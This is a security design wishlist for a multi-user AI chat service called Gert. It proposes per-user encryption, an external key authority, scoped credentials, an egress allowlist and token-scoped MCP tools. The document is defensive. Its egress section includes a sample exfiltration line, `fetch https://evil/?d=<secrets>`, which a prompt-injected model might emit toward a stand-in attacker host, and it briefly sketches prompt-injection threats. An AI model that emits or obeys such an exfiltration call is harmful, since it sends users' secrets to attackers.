# Defense in depth - the hardening wishlist

> **Status: wishlist / aspirational.** Nothing here is implemented. This is the target we are
> steering toward, not the shipped posture - [security.md](security.md) is what ships today
> (findings F1-F12, all live and tested). Unlike a committed, dependency-ordered
> build plan, this is a *direction*: each item earns its
> place by the blast radius it removes, and we adopt them as the cost/benefit justifies.

Gert's isolation today is **structural** - the store scopes by the token-derived user key, so no
application query can stray across users ([principle #2/#3](principles.md)) - and the cross-cutting
controls F1-F12 harden the content the box renders and fetches. Both are strong. Both share one
unstated assumption: **the Gert process is honest.**

## The assumption we are relaxing

In one address space, the running process holds the means to read *every* user's stores and a
credential that reaches the *whole* data plane. So a single remote-code-execution bug - in a
parser, a dependency, a deserialiser, a sandbox escape - is not a per-user incident; it is
**ambient authority over the entire corpus**, plus the ability to ship it anywhere outbound code
can reach. The accepted residual in [security section 4](security.md#4-residual-risks-we-accept)
("exfiltration via outbound channels") is the visible tip; the deeper gap is *the process itself
as a single point of total compromise.* Defense in depth means making the per-user invariant hold
**even when the process does not** - by moving enforcement out of Gert's own code and into trust
domains a compromised Gert cannot speak for.

## North-star invariant

> Two clauses, both enforced **outside** the Gert process:
>
> 1. **Reachability is bounded.** At any instant Gert can decrypt and access the data only of the
>    users it currently holds a valid token for - never the whole corpus. Enforced by an external
>    key/credential **authority**, not by Gert's own code.
> 2. **Egress is bounded.** User data leaves the trust boundary only through a fixed, audited
>    allowlist of destinations. Enforced at the network layer, not by app code.
>
> Together they bound both halves of every exfiltration/composite threat - *read everything* and
> *send it anywhere* - and turn a breach from "assume total loss" into a bounded, enumerable
> exposure. The rest of this doc is the machinery that makes those two clauses true.

## Priorities at a glance

| Tier | Items | Buys | Lift |
|------|-------|------|------|
| **Adopt early** (config / infra) | Egress allowlist (§6); OS hardening + worker privilege separation (§5); audit foundation (§7) | Caps exfiltration and RCE reach with little code churn | low-med |
| **Arrives with server backends** | Scoped data credentials (§2) | Per-user store/DB access enforced by the backend, not Gert | med (rides Postgres / S3) |
| **The keystone** (big lift) | External key authority + per-user encryption (§1); authority attestation (§3); crypto-shred (§4) | Bounds reachability to active-token users; near-instant erase | high |
| **Ongoing** | Tool-loop containment (§8) + token-scoped MCP tools (§9); secrets / rotation / backups (§10) | Shrinks prompt-injection and exfiltration blast radius; no standing god-secret | low-med |

---

## 1. External key authority + per-user encryption  (the keystone)

**Want:** every user-scoped byte at rest encrypted under a **per-user data key (DEK)**; DEKs wrapped
by a key-encryption key (KEK) that lives *only* inside an external **key authority** in its own
trust domain. Gert holds ciphertext and a thin client - to read user X's data it asks the authority
to unwrap X's DEK, and gets it only on proof of a live, valid token for X (§3).

How it lands on Gert's seams, which are already the right chokepoints:

- **Object store:** an **encrypting `IObjectStore` decorator** in front of the `Local` / S3 backend
  envelope-encrypts each blob (`files/`) under the scope's DEK before `PutAsync` and
  decrypts after `OpenReadAsync`. The backend only ever sees ciphertext; an attacker with the bucket
  or the disk gets nothing. `ObjectScope.UserKey` is the natural DEK label.
- **Databases:** the providers (`IUserDatabaseProvider` / `IChatDatabaseProvider` /
  `IRagIndexProvider`) open each user's store with its DEK - file-per-user SQLite via a page-encrypting
  build (SQLCipher-style) keyed per file, or, where the engine can't, app-level AEAD on the sensitive
  columns (message content, document text, embeddings). A server engine (Postgres / pgvector) uses TDE
  or column encryption keyed per schema.
- **Key handling:** DEKs live in memory only, cached per live turn with a short TTL, zeroized on
  completion - never written to disk, never logged. Optionally derive `DEK = HKDF(KEK, userKey, version)`
  so the authority stays near-stateless and rotation is a version bump.
- **Integrity, not just secrecy:** AEAD (AES-GCM / XChaCha20-Poly1305) with `AAD = userKey ∥ object-or-table-key ∥ version`,
  so ciphertext cannot be moved between users/objects or silently swapped - tamper-evidence by
  construction.

**Buys:** a compromised Gert can decrypt only the users whose tokens flow through it during the
compromise window; the rest of the corpus stays ciphertext, and the KEK is unreachable without also
breaching the authority. Plus crypto-shred (§4) and at-rest integrity (§7).

**Cost (honest):** crypto on the hot path and a key round-trip on cold access; a SQLCipher-style
dependency or field-level encryption work; the operational burden of running an authority. This is
the biggest lift in the doc - hence "keystone," adopted deliberately, not first.

**Shape:** model the authority as a **capability plugin** (`Gert:Keys:Type`) exactly like chat /
database / rag / storage - an **inert local impl** for dev and `make test` (DEK derived in-process
from a dev master key; identical API, no real separation, offline) and a real external impl (Vault
Transit, a cloud KMS, or a purpose-built keykeeper sidecar). Same contracts-vs-impl split, same
architecture tests.

## 2. Least-privilege data credentials  (scope the access, not only the bytes)

**Want:** even before bytes are encrypted, never hand Gert one credential that reaches the whole data
plane. Per request, the authority mints a credential **scoped to `users/{key}/`** and bound to the
current user:

- **Object store:** S3 STS `AssumeRole` with a session policy pinned to the `users/{key}/*` prefix,
  or an Azure user-delegation SAS scoped to the path - minutes-long.
- **Database:** short-lived dynamic credentials (e.g. Vault database secrets) for a role limited to
  this user's schema (`SET ROLE`) on a server engine; for file-per-user SQLite the analogues are the
  per-file DEK (§1) plus filesystem ACLs and the scoped open.

**Buys:** the *live* credential a compromised handler holds cannot list or read another user's
objects or rows - the store/DB enforces the scope, not Gert. This is the literal reading of the ask:
**scope Gert to the access it requires, for both databases and file stores.** It lands naturally with
the server backends (`Gert.Database.Postgres`, an S3/Azure object store) where scoped credentials are
a first-class feature.

## 3. The authority as an independent policy point  (it enforces Gert's correctness)

The authority must not take Gert's word for "I am serving user X." Two proofs gate every key unwrap or
credential mint:

- **Workload attestation** (SPIFFE/SVID or mTLS) - proves "this caller is the Gert workload," so a
  leaked static secret alone is useless.
- **The end-user JWT, re-verified by the authority itself** against Pocket ID's JWKS - the same
  fail-closed checks Gert runs ([security F12](security.md#3-findings--remediations)) repeated in a
  second, independent domain.

Policy: issue user X's DEK / scoped credential only to attested-Gert presenting a valid, unexpired
token for X. This is what *"an external provider that enforces correct behaviour of Gert"* means
concretely - a second enforcement of the per-user invariant, plus **rate limits** (a healthy Gert
unwraps O(active users) keys; one mass-requesting is anomalous and throttleable) and the **audit
trail** (§7).

## 4. Crypto-shred deletion  (a property of §1, called out)

Deletion today is each store erasing a scope, made crash-consistent by a journal + idempotent forward
recovery ([principle #5](principles.md), [decisions section 12](decisions.md#12-deletion-crash-consistency---a-journal--idempotent-forward-recovery)).
With §1 it gains a decisive **first step: destroy the user's/project's DEK in the authority.** The
instant the key is gone, all of that scope's ciphertext - DB files, blobs, **and backups** - is
permanently unrecoverable, regardless of when the physical bytes are unlinked.

**Buys:** erasure becomes effectively instant and complete even if a later store-drop is interrupted -
the journal's forward recovery now races *undecryptable residue*, not live data. Effective sub-hour
erase without depending on every backend's delete latency.

## 5. Privilege-separate the process  (promote plugin seams to trust boundaries)

The capability-plugin seams already partition the system by function; promote the security-critical
ones to **process / trust boundaries** so the code that touches untrusted bytes never shares an
address space with the keys:

- **Untrusted-content workers** - text extraction (already an isolated subprocess,
  [F7](security.md#3-findings--remediations)), the web fetcher / SSRF surface, anything parsing
  model / web / upload bytes - run with **no key-authority access and no data credentials.** They take
  bytes, return results.
- **The data-access core** - DB / RAG / object store plus the key-authority client - is a separate,
  smaller, more-audited component that alone holds the sensitive client.
- **OS hardening throughout:** unprivileged uid, read-only root filesystem, `no-new-privileges`,
  dropped Linux capabilities, a seccomp-bpf syscall allowlist, a minimal base image. The Python
  sandbox is already monty / gVisor ([chat-and-tools](chat-and-tools.md#sandbox---security-critical)).

**Buys:** a parser or dependency RCE lands where it can neither read the corpus directly nor ask the
authority for arbitrary users' keys - it has to pivot, and §6 is waiting if it tries to leave.

## 6. Egress allowlist  (the exfiltration brake)

**Want:** default-deny outbound at the **network** layer (egress proxy / NetworkPolicy / firewall),
independent of app code. The only reachable destinations: the chat upstream, the embeddings upstream,
SearXNG, Pocket ID's JWKS, the key authority, and the storage / DB endpoints. Everything else is
dropped.

**Buys** clause 2 of the north-star: a compromised process, a prompt-injected model emitting
`fetch https://evil/?d=<secrets>`, or a phone-home artifact cannot ship data to an arbitrary endpoint
- the brake sits below the app, so an app-level bypass does not help. It is the server-side twin of
the browser's CSP `connect-src` ([F1/F3](security.md#3-findings--remediations)).

**The sharp edge:** `web_search` / `web_fetch` are user-influenced egress *by design* (SearXNG fetches
arbitrary URLs). Keep that the **only** such path, behind the existing SSRF guard and size/time caps
([F5](security.md#3-findings--remediations), [web search](chat-and-tools.md#web-search-searxng)), and
run SearXNG / the fetcher in its **own network zone** so the arbitrary-URL capability lives there, not
in the data-access core; §9 binds that allowlist to the tool's own scoped token, enforcing it at the
tool boundary as well as the network. Log per-destination volume so a slow exfil through an allowed
channel is at least visible.

## 7. Tamper-evident audit in a separate domain

Every key unwrap, scoped-credential mint, and admin action is written **append-only to a store Gert
cannot rewrite** (the authority's domain), ideally hash-chained. **Buys:** a breach stops being opaque
- the set of DEKs unwrapped between T0 and T1 *is* the exact exposure set, so an incident becomes
bounded and enumerable instead of "assume the whole corpus." Complements the AEAD integrity from §1: a
swapped or relocated ciphertext fails its AAD check rather than reading as genuine.

## 8. Contain the tool loop  (prompt-injection blast radius)

Prompt injection is an accepted, self-scoped residual ([security section 4](security.md#4-residual-risks-we-accept))
- isolation already denies it cross-tenant reach. Shrink what it can do *within* one user:

- Treat retrieved / web / prior-turn text as **data with provenance**, not instructions - delimited
  and labelled untrusted in the prompt.
- Keep the JWT entitlement ceiling ([F11](security.md#3-findings--remediations)) and add per-turn
  capability scoping (§9); cap sub-agent depth and fan-out.
- Human-in-the-loop (`ask_user`) before irreversible or high-impact actions.
- The egress brake (§6) is the hard backstop for when injection wins anyway.

## 9. Token-scoped tools over MCP  (enforceable per-tool allowlists)

**Want:** expose Gert's tools - and any third-party tool or data source - as **MCP servers invoked
with a per-call scoped token**, instead of in-process code holding ambient capability. The token,
minted by the authority (§3) from the user's `gert_tools` entitlement (the claim is the ceiling -
[F11](security.md#3-findings--remediations), [auth](auth.md#enforcement---the-claim-is-the-ceiling)),
authorizes exactly the capability and scope a call needs and nothing more.

**This holds for *every* MCP server, each with its own limits.** `web_fetch` / `web_search` run as
their own server in their own trust domain - **no data-plane or key-authority access** (§5) - with a
token bound to an **enforceable destination allowlist**: a prompt-injected model, or a compromised
core, asking it to reach `evil.com` is refused *at the tool boundary* because the token does not
authorize that destination. The sandbox's token authorizes **no egress at all**, matching its
egress-off default ([chat-and-tools](chat-and-tools.md#sandbox---security-critical)); a `rag` server's
token is scoped to the one user's index; a third-party connector gets only its own resource allowlist.
Each server's allowlist is the **tool-side twin** of the network egress brake (§6) and a third
independent layer above the app-level SSRF guard ([F5](security.md#3-findings--remediations)) -
exfiltration now needs the token policy, the SSRF guard, **and** the network allowlist to fail at once.

**Buys (blast radius):** each tool is a separate least-privilege server; the core hands it a narrow,
short-lived, per-invocation token, never its own credentials. A compromised tool server can do only
what its token allows; a compromised core can only ask a tool to do what the per-call token authorizes.
Every mint is audited (§7), so tool use is enumerable after the fact. The same authority that scopes
*data* (§1-§3) becomes the single policy point that scopes *capability* too - one place enforces both
halves of least privilege.

**Fits Gert:** the `ITool` / `ToolRegistry` seam and the `gert_tools` ceiling already model
"capability is granted, not assumed"; MCP makes each tool a token-bound server behind that seam, and
the capability-plugin pattern already supports dropping in an MCP-backed implementation. Consuming
*external* MCP servers is safe for the same reason - each gets only a scoped token, never ambient reach
into user data.

**Note:** MCP is an evolving standard and the token-minting / scoping layer is real work; keep the
SSRF guard and the network brake (§6) regardless - this is a *layer*, not a replacement.

## 10. Secrets, rotation, backups

No long-lived god-secret in the process image or env: fetch the authority / storage clients' own
credentials via workload identity, short-TTL, rotated. Rotate the KEK - version-tagged DEKs make this
a re-wrap, not a bulk re-encrypt. Zeroize key material in memory after use. Backups inherit per-user
encryption, so a backup never widens the blast radius and crypto-shred (§4) reaches them too.

---

## Design tensions we accept going in

- **Performance.** Per-blob / per-page crypto and a key round-trip on cold access. Mitigated by
  short-lived in-memory DEK caching scoped to the live turn, and by user-sticky multi-instance routing
  (a user's keys stay warm on one instance - an open multi-instance topology question).
- **SQLite vs server engines.** File-per-user SQLite wants page-level encryption (a SQLCipher-style
  build) or column AEAD; the cleanest scoped-credential and TDE story arrives with a server
  database / vector store ([tech-stack engine portability](tech-stack.md#engine-portability)). The
  wishlist is engine-neutral by design - the same stance as [principle #2](principles.md).
- **Web-search egress** is the one intentional hole in clause 2; the token-scoped allowlist (§9) and
  the network brake (§6) *contain* it rather than fully closing it.
- **Operational and dev cost.** Running an authority is real ops. The inert local impl (§1) keeps the
  test suite and dev loop keyless and offline; the separation is a deployment choice, not a code fork.

## Non-goals

- Defending against a compromised IdP, or a malicious operator with authority access - the
  trusted-operator stance stays ([security section 4](security.md#4-residual-risks-we-accept)).
- Hiding access *patterns* / metadata (object sizes, timing) from infrastructure - this is
  confidentiality of content, not traffic-analysis resistance.
- Client-side / end-to-end encryption where the server never holds plaintext - incompatible with
  server-side RAG, embeddings, and search over the data.
- A formal HSM mandate - the KEK *may* live in an HSM, but that is not required to start.

## How this maps back

- **Closes** the [security section 4](security.md#4-residual-risks-we-accept) residuals it can:
  exfiltration-via-outbound (§6, §9), and the blast-radius-of-compromise gap that section does not yet
  name (§1-§3, §5, §7).
- **Reinforces** the principles: [#2](principles.md) (isolation now survives a *dishonest* process,
  not only honest app code), [#3](principles.md) (the user key becomes the key-derivation and
  credential-scoping handle, not just a store name - [decisions section 3](decisions.md#3-user-key)),
  and [#5](principles.md) (crypto-shred, §4).
- **Follows the existing shape.** The key authority is just another capability plugin
  (`Gert:Keys:Type`) with an inert dev impl and a real external impl - the same contracts-vs-impl
  split as chat / database / rag / storage, enforced by the same architecture tests. Nothing here asks
  the architecture to change posture; it asks the *deployment* to stop trusting one process with
  everything.
